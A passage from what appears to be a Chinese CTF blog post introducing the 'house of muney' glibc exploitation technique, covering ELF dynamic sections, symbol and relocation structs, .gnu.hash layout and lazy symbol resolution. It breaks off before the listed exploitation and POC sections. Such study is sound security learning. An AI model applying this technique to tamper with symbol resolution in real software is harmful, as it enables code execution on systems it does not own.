+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >Tea</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >我的博客</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/pwn/"
+      >PWN</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/pwn/heap/"
+      >Basics</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/"
+      >House of系列</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-muney/"
+      >posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="0001-01-01T00:00:00&#43;00:00">0001 年 6 月 1 日</time><span class="px-2 text-primary-500">&middot;</span><span>5908 字</span><span class="px-2 text-primary-500">&middot;</span><span title="预计阅读">12 分钟</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Tea" src="/img/blowfish_logo_hu10440971084165979012.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Tea
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">快来康康我的文章</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/K1r2-svg"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#house-of-muney">house of muney</a>
+      <ul>
+        <li><a href="#elf文件解析">ELF文件解析</a>
+          <ul>
+            <li><a href="#节的结构">节的结构</a></li>
+          </ul>
+        </li>
+        <li><a href="#查找函数符号真实地址流程">查找函数符号真实地址流程</a>
+          <ul>
+            <li><a href="#调用大概">调用大概</a></li>
+            <li><a href="#细节">细节</a></li>
+            <li><a href="#heading"></a></li>
+          </ul>
+        </li>
+        <li><a href="#利用攻击">利用攻击</a>
+          <ul>
+            <li><a href="#利用流程">利用流程</a></li>
+            <li><a href="#poc">POC</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#house-of-muney">house of muney</a>
+      <ul>
+        <li><a href="#elf文件解析">ELF文件解析</a>
+          <ul>
+            <li><a href="#节的结构">节的结构</a></li>
+          </ul>
+        </li>
+        <li><a href="#查找函数符号真实地址流程">查找函数符号真实地址流程</a>
+          <ul>
+            <li><a href="#调用大概">调用大概</a></li>
+            <li><a href="#细节">细节</a></li>
+            <li><a href="#heading"></a></li>
+          </ul>
+        </li>
+        <li><a href="#利用攻击">利用攻击</a>
+          <ul>
+            <li><a href="#利用流程">利用流程</a></li>
+            <li><a href="#poc">POC</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">House of 系列 
+    <div id="house-of-%E7%B3%BB%E5%88%97" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#house-of-%E7%B3%BB%E5%88%97" aria-label="锚点">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">house of muney 
+    <div id="house-of-muney" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#house-of-muney" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">ELF文件解析 
+    <div id="elf%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#elf%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+
+
+<h4 class="relative group">节的结构 
+    <div id="%E8%8A%82%E7%9A%84%E7%BB%93%E6%9E%84" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%8A%82%E7%9A%84%E7%BB%93%E6%9E%84" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>
+<p>静态视图下，组成<code>elf</code>文件的基本单位是<code>section</code>，可以翻译为节。</p>
+</li>
+<li>
+<p><code>elf</code>头会定义节头表(所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如<code>dyn/rel</code>等)</p>
+</li>
+<li>
+<p>节头表中定义了节的数量、每个节的类型、起始的虚拟地址。</p>
+</li>
+<li>
+<p>与动态链接相关的节为<code>.dynamic</code>节，这里面存储这与动态链接相关的描述信息。</p>
+<ul>
+<li><code>.dynamic</code>实际是一个数组，数组的每一个元素对应的数据结构为：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">Elf64_Sxword</span>	<span class="n">d_tag</span><span class="p">;</span>			<span class="cm">/* Dynamic entry type. 表示的是节的类型 */</span> 
+</span></span><span class="line"><span class="cl"><span class="k">union</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Xword</span> <span class="n">d_val</span><span class="p">;</span>			<span class="cm">/* Integer value */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Addr</span> <span class="n">d_ptr</span><span class="p">;</span>			<span class="cm">/* Address value */</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//这个联合体有时候表示的是这个节处在节表中的下标，有时候表示这个节的虚拟地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Dyn</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>与符号查找相关的是<code>STRTAB</code>和<code>SYMTAB</code>节类型。</p>
+<ul>
+<li>
+<p><code>STRTAB</code>：字符串表 ，包含一大串字符串，包含整个程序中所使用到的所有字符。</p>
+</li>
+<li>
+<p><code>SYMTAB</code>：符号表，包含符号的定义，其对应的数据结构为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Word</span>  <span class="n">st_name</span><span class="p">;</span>   <span class="c1">// 符号名在.dynstr中的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="c1">// 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> <span class="c1">//通常为 0，表示符号可见性为默认（无需修改）。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> <span class="c1">// 符号所属的节区索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Addr</span>    <span class="n">st_value</span><span class="p">;</span> <span class="c1">// 符号的地址（如函数地址）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Xword</span>   <span class="n">st_size</span><span class="p">;</span>  <span class="c1">// 符号大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//如果修改st_name这个下标，就能解析出不同的符号地址。
+</span></span></span><span class="line"><span class="cl"><span class="c1">//关于st_value,当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了PIE，那么符号的实际地址就是加载的基地址加上这个值。
+</span></span></span></code></pre></div><ul>
+<li><strong>符号类型</strong>：符号的绑定属性（<code>st_info</code>字段）分为：
+<ul>
+<li><strong>STB_LOCAL</strong>：局部符号，仅在当前模块可见。 0x0</li>
+<li><strong>STB_GLOBAL</strong>：全局符号，可被其他模块引用。 0x1</li>
+<li><strong>STB_WEAK</strong>：弱符号，优先级低于全局符号。 0x2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。</p>
+</li>
+<li>
+<p>重定位表数据结构</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span>	<span class="n">r_offset</span><span class="p">;</span>		<span class="cm">/* Address */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span>	<span class="n">r_info</span><span class="p">;</span>			<span class="cm">/* Relocation type and symbol index */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Rel</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li><code>r_offset</code>：这个值代表对应符号在<code>got</code>表中的地址。使用 <code>libc.got['xxx']</code>得到的就是这个地址。</li>
+<li><code>r_info</code>：有两部分组成，低<code>32</code>位表示重定位入口的类型，高<code>32</code>位表示这个重定位符号在符号表中的下标。</li>
+</ul>
+</li>
+<li>
+<p>ret2plt流程图</p>
+<ul>
+<li>
+<p>plt[0]处代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="no">ModuleID</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="no">_dl_runtime_resolve</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>第一次调用got表处代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="no">n</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="no">plt</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+
+<h5 class="relative group"><strong>.gnu.hash 节的结构</strong> 
+    <div id="gnuhash-%E8%8A%82%E7%9A%84%E7%BB%93%E6%9E%84" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#gnuhash-%E8%8A%82%E7%9A%84%E7%BB%93%E6%9E%84" aria-label="锚点">#</a>
+    </span>        
+    
+</h5>
+<p><code>.gnu.hash</code> 节的结构如下（以64位ELF为例）：</p>
+<ol>
+<li><strong><code>nbuckets</code></strong> (4字节)：哈希桶的数量。</li>
+<li><strong><code>symndx</code></strong> (4字节)：第一个全局符号在动态符号表（<code>.dynsym</code>）中的索引。</li>
+<li><strong><code>maskwords</code></strong> (4字节)：布隆过滤器掩码的位数（以 <code>_wordsize</code> 为单位）。</li>
+<li><strong><code>shift2</code></strong> (4字节)：布隆过滤器计算的位移值。</li>
+<li><strong>布隆过滤器数组</strong>：每个元素大小为 <code>_wordsize</code> 字节（64位下为8字节）。</li>
+<li><strong>哈希桶数组</strong>：每个桶条目占4字节，指向符号链表的起始索引。</li>
+<li><strong>哈希值数组</strong>：每个哈希值占4字节。</li>
+</ol>
+
+
+<h3 class="relative group">查找函数符号真实地址流程 
+    <div id="%E6%9F%A5%E6%89%BE%E5%87%BD%E6%95%B0%E7%AC%A6%E5%8F%B7%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80%E6%B5%81%E7%A8%8B" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%9F%A5%E6%89%BE%E5%87%BD%E6%95%B0%E7%AC%A6%E5%8F%B7%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80%E6%B5%81%E7%A8%8B" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+
+
+<h4 class="relative group">调用大概 
+    <div id="%E8%B0%83%E7%94%A8%E5%A4%A7%E6%A6%82" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%B0%83%E7%94%A8%E5%A4%A7%E6%A6%82" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+<ol>
+<li>
+<p>从 <code>plt</code> 表跳转到 <code>got</code> 表</p>
+</li>
+<li>
+<p><code>push n/push ModuleID</code>，然后跳转到<code>_dl_runtime_resolve</code> 函数。</p>
+</li>
+<li>
+<p>上一步实际是找到符号的重定位表条目。在重定位表中，分别记录了解析好地址后需要回填的地址，即符号的 <code>got</code> 表地址，同时记录了符号所在的符号表的下标。</p>
+</li>
+<li>
+<p>动态链接器解析符号（如调用<code>exit</code>）</p>
+<ol>
+<li><strong>计算哈希值</strong>：对符号名（如<code>&quot;exit&quot;</code>）计算GNU哈希值。</li>
+<li><strong>布隆过滤</strong>：检查哈希值是否可能存在于哈希表中。</li>
+<li><strong>定位哈希桶</strong>：根据哈希值找到对应的哈希桶（<code>bucket</code>）。</li>
+<li><strong>遍历哈希链</strong>：
+<ul>
+<li>从桶中获取链的起始索引 <code>chain_index</code>。</li>
+<li>实际符号索引 bucket = <code>chain_index + symoffset</code>。
+<ul>
+<li><code>symoffset</code> 是 <strong>.dynsym 中第一个全局符号的索引值</strong>。</li>
+<li>例如，若 <code>.dynsym</code> 前5个符号是局部符号（索引0~4），第6个符号（索引5）是第一个全局符号，则 <code>symoffset = 5</code>。</li>
+</ul>
+</li>
+<li>遍历哈希链，匹配哈希值后，通过索引在 <code>.dynsym</code> 中找到符号条目。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>找到符号之后，计算出真实的偏移，然后填回到 <code>got</code> 表，避免下一次重新解析</p>
+</li>
+<li>
+<p>调用该函数</p>
+</li>
+</ol>
+
+
+<h5 class="relative group">.gnu.hash节中的哈希桶和 .dynsym 节的关系 
+    <div id="gnuhash%E8%8A%82%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E6%A1%B6%E5%92%8C-dynsym-%E8%8A%82%E7%9A%84%E5%85%B3%E7%B3%BB" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#gnuhash%E8%8A%82%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E6%A1%B6%E5%92%8C-dynsym-%E8%8A%82%E7%9A%84%E5%85%B3%E7%B3%BB" aria-label="锚点">#</a>
+    </span>        
+    
+</h5>
+<pre tabindex="0"><code>.gnu.hash 节                          .dynsym 节
++-------------------+               +-------------------+
+| 哈希桶数组         |               | Elf64_Sym[0]     |
+| buckets[0]: 0     +--------------&gt;| (局部符号，忽略)   |
+| buckets[1]: 2     |               +-------------------+
+| ...               |               | Elf64_Sym[1]     |
++-------------------+               | (局部符号，忽略)   |
+                                    +-------------------+
+哈希链数组index = bucket - symoffset  | Elf64_Sym[bucket] |
++-------------------+               | (全局符号开始)      |
+| hasharr[index]:0xABC  | &lt;---------|st_name: &#34;exit&#34; 	|
+| hasharr[index+1]:0xDEF|           | st_value: 0x...   |
++-------------------+               +-------------------+
+</code></pre>
+
+<h4 class="relative group">细节 
+    <div id="%E7%BB%86%E8%8A%82" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%BB%86%E8%8A%82" aria-label="锚点">#</a>
+    </span>        
+    
+</h4>
+
+
+<h5 class="relative group">涉及的数据结构 
+    <div id="%E6%B6%89%E5%8F%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%B6%89%E5%8F%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84" aria-label="锚点">#</a>
+    </span>        
+    
+</h5>
+<ul>
+<li>
+<p><code>.dynamic</code> 实际是一个数组，数组的每一个元素对应的数据结构：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Sxword</span>	<span class="n">d_tag</span><span class="p">;</span>			<span class="cm">/* Dynamic entry type */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">union</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Elf64_Xword</span> <span class="n">d_val</span><span class="p">;</span>		<span class="cm">/* Integer value */</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Elf64_Addr</span> <span class="n">d_ptr</span><span class="p">;</span>			<span class="cm">/* Address value */</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Dyn</span><span class="p">;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>符号表的数据结构：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Word</span>  <span class="n">st_name</span><span class="p">;</span>   <span class="c1">// 符号名在.dynstr中的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="c1">// 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> <span class="c1">// 符号所属的节区索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Addr</span>    <span class="n">st_value</span><span class="p">;</span> <span class="c1">// 符号的地址（如函数地址）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Xword</span>   <span class="n">st_size</span><span class="p">;</span>  <span class="c1">// 符号大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>重定位表的数据结构：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span>	<span class="n">r_offset</span><span class="p">;</span>		<span class="cm">/* Address */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span>	<span class="n">r_info</span><span class="p">;</span>			<span class="cm">/* Relocation type and symbol index */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Rel</span><span class="p">;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>link_map的数据结构：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">symtab_cache</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 这里可以包含缓存相关的具体成员，如哈希表、缓存条目等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 简化示例中暂不详细展开
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 表示已找到的版本信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">r_found_version</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 这里可以包含版本相关的具体成员，如版本号、版本标志等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 简化示例中暂不详细展开
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 链接映射结构，代表一个已加载的共享对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">link_map</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 共享对象加载到内存中的基地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 所有共享对象内的相对地址都要加上这个基地址才是实际内存地址
